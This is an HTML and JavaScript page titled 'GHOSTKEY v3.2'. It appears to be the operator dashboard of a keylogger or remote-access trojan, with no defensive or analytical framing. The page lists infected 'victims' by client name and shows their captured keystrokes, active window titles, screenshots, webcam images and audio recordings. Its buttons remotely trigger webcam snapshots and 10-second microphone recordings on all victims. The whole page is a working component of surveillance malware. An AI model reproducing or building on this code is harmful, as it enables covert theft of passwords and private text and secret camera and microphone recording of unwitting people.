<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>GHOSTKEY v3.2</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');
  body{margin:0;background:#000;color:#0ff;font-family:'Orbitron',sans-serif;overflow-x:hidden}
  canvas{position:fixed;top:0;left:0;z-index:-1;opacity:0.2}
  .container{padding:20px;max-width:1600px;margin:auto;position:relative}
  h1{font-size:3.5em;text-shadow:0 0 30px #0ff;letter-spacing:5px}
  .dot{width:18px;height:18px;background:#0f0;border-radius:50%;box-shadow:0 0 25px #0f0;animation:p 1.5s infinite}
  @keyframes p{0%,100%{opacity:1}50%{opacity:0.3}}
  .controls{margin:20px 0;display:flex;gap:15px;align-items:center;flex-wrap:wrap}
  button{background:#000;border:2px solid #f06;color:#f06;padding:12px 24px;font-size:1em;cursor:pointer;border-radius:8px;box-shadow:0 0 20px #f06;transition:0.3s}
  button:hover{background:#f06;color:#000;box-shadow:0 0 40px #f06;transform:scale(1.05)}
  #webcamBtn{border-color:#ff0;color:#ff0;box-shadow:0 0 20px #ff0}
  #webcamBtn:hover{background:#ff0;color:#000}
  #micBtn{border-color:#f0f;color:#f0f;box-shadow:0 0 20px #f0f}
  #micBtn:hover{background:#f0f;color:#000}
  select{background:#000;border:2px solid #0ff;padding:10px;color:#0ff;border-radius:8px}
  table{width:100%;border-collapse:collapse;background:rgba(0,20,40,0.7);border:2px solid #0ff;box-shadow:0 0 40px rgba(0,255,255,0.4)}
  th{background:rgba(0,255,255,0.2);padding:15px;color:#0ff;text-shadow:0 0 15px #0ff}
  td{padding:12px;border-bottom:1px solid rgba(0,255,255,0.3)}
  .keys{
    font-family:monospace;background:#001;color:#0f0;padding:10px;border-radius:6px;
    max-height:120px;overflow-y:auto;word-wrap:break-word;white-space:pre-wrap;
    border:1px solid #033;box-shadow:inset 0 0 10px rgba(0,255,255,0.2);
  }
  .ss{max-width:220px;max-height:124px;cursor:pointer;border:3px solid #033;border-radius:8px;transition:0.3s}
  .ss:hover{border-color:#0ff;transform:scale(1.08);box-shadow:0 0 30px #0ff}
  .webcam{border:3px solid #f06 !important;box-shadow:0 0 30px #f06 !important}
  .audio{border:3px solid #f0f !important;box-shadow:0 0 30px #f0f !important}
  .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.98);justify-content:center;align-items:center;z-index:999}
  .modal img,.modal audio{max-width:95%;max-height:95vh;border:4px solid #0ff;border-radius:12px}
  .signature{position:fixed;top:15px;right:20px;font-size:1.4em;color:#0ff;text-shadow:0 0 20px #0ff;z-index:999;letter-spacing:3px}
</style></head><body>

<canvas id="matrix"></canvas>
<div class="container">
  <h1><span class="dot"></span> GHOSTKEY <span style="color:#0f0">v3.2</span></h1>
  <div class="controls">
    <div>Filter: <select id="filter"><option value="">ALL VICTIMS</option></select></div>
    <button id="clearBtn">CLEAR ALL LOGS</button>
    <button id="webcamBtn">WEBCAM SNAP</button>
    <button id="micBtn">MIC 10s</button>
    <div style="margin-left:auto;color:#0f0">Total: <span id="total">0</span></div>
  </div>

  <table><thead><tr>
    <th>#</th><th>Time</th><th>Client</th><th>Window</th><th>Keys</th><th>Media</th>
  </tr></thead><tbody id="logs"></tbody></table>
</div>

<div class="signature">— CENTRALI —</div>
<div id="modal" class="modal" onclick="this.style.display='none'"><img id="big"><audio id="audio" controls></audio></div>

<script>
// Matrix rain
const c = document.getElementById('matrix'); const ctx = c.getContext('2d');
c.width = innerWidth; c.height = innerHeight;
const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
const drops = []; for(let i=0;i<c.width/10;i++) drops[i]=1;
function draw(){ctx.fillStyle='rgba(0,0,0,0.05)';ctx.fillRect(0,0,c.width,c.height);ctx.fillStyle='#0f0';ctx.font='12px monospace';
for(let i=0;i<drops.length;i++){let t=chars[Math.floor(Math.random()*chars.length)];ctx.fillText(t,i*10,drops[i]*15);if(drops[i]*15>c.height&&Math.random()>0.975)drops[i]=0;drops[i]++}}
setInterval(draw,35);

let counter = 1;
const tbody = document.getElementById("logs");
const filter = document.getElementById("filter");
const totalEl = document.getElementById("total");
const allLogs = [];
const clients = new Set();

document.getElementById("clearBtn").onclick = () => confirm("NUKE?") && (tbody.innerHTML = "", counter = 1, totalEl.textContent = "0");
document.getElementById("webcamBtn").onclick = () => confirm("WEBCAM ALL?") && fetch("/cmd/webcam");
document.getElementById("micBtn").onclick = () => confirm("RECORD MIC 10s?") && fetch("/cmd/mic");

function updateFilter() {
  const cur = filter.value;
  filter.innerHTML = '<option value="">ALL VICTIMS</option>';
  [...clients].sort().forEach(c => {
    const o = document.createElement("option"); o.value = c; o.textContent = c;
    if (c === cur) o.selected = true;
    filter.appendChild(o);
  });
}

function addLog(d) {
  if (!d.Client) return;
  allLogs.push(d);
  clients.add(d.Client);
  updateFilter();

  if (filter.value && filter.value !== d.Client) return;

  const row = document.createElement("tr");
  row.innerHTML = `
    <td>${counter++}</td>
    <td>${d.timestamp?.slice(11,19)||""}</td>
    <td><b style="color:#0f0">${d.Client}</b></td>
    <td>${d.Window||"-"}</td>
    <td><div class="keys">${(d.Keys||[]).join("")||"no keys"}</div></td>
    <td>
      ${d.Screenshot ? `<img class="ss" src="${d.Screenshot}" onclick="document.getElementById('big').src=this.src;document.getElementById('modal').style.display='flex'">` : ""}
      ${d.Webcam ? `<br><img class="ss webcam" src="${d.Webcam}" onclick="document.getElementById('big').src=this.src;document.getElementById('modal').style.display='flex'">` : ""}
      ${d.Audio ? `<br><audio controls class="audio" src="${d.Audio}" style="width:220px;margin-top:8px;"></audio>` : ""}
    </td>
  `;
  tbody.insertBefore(row, tbody.firstChild);
  totalEl.textContent = tbody.children.length;
}

filter.onchange = () => {
  tbody.innerHTML = ""; counter = 1;
  allLogs.filter(l => !filter.value || l.Client === filter.value).forEach(addLog);
};

let es = new EventSource("/events");
es.onmessage = e => { if (!e.data || e.data.startsWith(":")) return; try { addLog(JSON.parse(e.data)); } catch{} };
es.onerror = () => { es.close(); setTimeout(() => es = new EventSource("/events"), 3000); };
fetch("/history").then(r=>r.json()).then(l=>l.forEach(addLog));
</script>
</body></html>